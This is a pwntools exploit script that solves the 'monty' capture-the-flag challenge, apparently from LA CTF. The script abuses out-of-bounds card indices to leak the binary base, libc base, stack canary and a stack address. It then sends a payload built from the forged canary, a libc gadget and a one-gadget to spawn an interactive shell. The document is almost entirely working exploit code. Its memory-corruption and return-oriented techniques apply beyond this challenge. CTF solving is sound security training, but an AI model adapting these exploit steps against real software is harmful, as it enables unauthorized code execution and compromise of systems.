#!/usr/bin/env python3

from pwn import *

exe = ELF("./monty_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

if args.REMOTE:
    r = remote("chall.lac.tf", 31133)
else:
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r)

# Swap leftover return address into cards[0] and leak it
r.sendlineafter(b'peek?', b'-3')
r.recvuntil(b'1: ')
exe.address = int(r.recvline(keepends=False)) - 0x1333
log.info(f"{hex(exe.address)=}")
# Swap cards[0] into return address of main and leak the return address of main
r.sendlineafter(b'peek?', b'61')
r.recvuntil(b'2: ')
libc.address = int(r.recvline(keepends=False)) - 0x2814a
log.info(f"{hex(libc.address)=}")
r.sendlineafter(b'lady! ', b'0')
r.sendlineafter(b'Name: ', b'')

# Execution loops back to the middle of the game function because the return address of main
# Leak canary
r.sendlineafter(b'peek?', b'15')
r.recvuntil(b'2: ')
canary = int(r.recvline(keepends=False))
log.info(f"{hex(canary)=}")
r.sendlineafter(b'lady! ', b'0')
r.sendlineafter(b'Name: ', b'')

# Program starts from the beginning again due to the funny loop
# Swap leftover return address into return address of game
r.sendlineafter(b'peek?', b'-3')
r.sendlineafter(b'peek?', b'59')
r.sendlineafter(b'lady! ', b'0')
r.sendlineafter(b'Name: ', b'')

# Leak stack
r.sendlineafter(b'peek?', b'0')
r.recvuntil(b'2: ')
stack = int(r.recvline(keepends=False))
log.info(f"{hex(stack)=}")
r.sendlineafter(b'lady! ', b'0')
# Forged canary
pl = p64(canary)
# Set r12 and rbp to stack pointer that points to null
pl += p64(stack + 0x1d0)
# Gadget to clear rdi
pl += p64(libc.address + 0xc5295)
# One gadget
pl += p64(libc.address + 0xde6a2)
# Overwrite saved rbp to point to the buffer
pl += p64(stack + 0x100)
r.sendafter(b'Name: ', pl)

r.interactive()
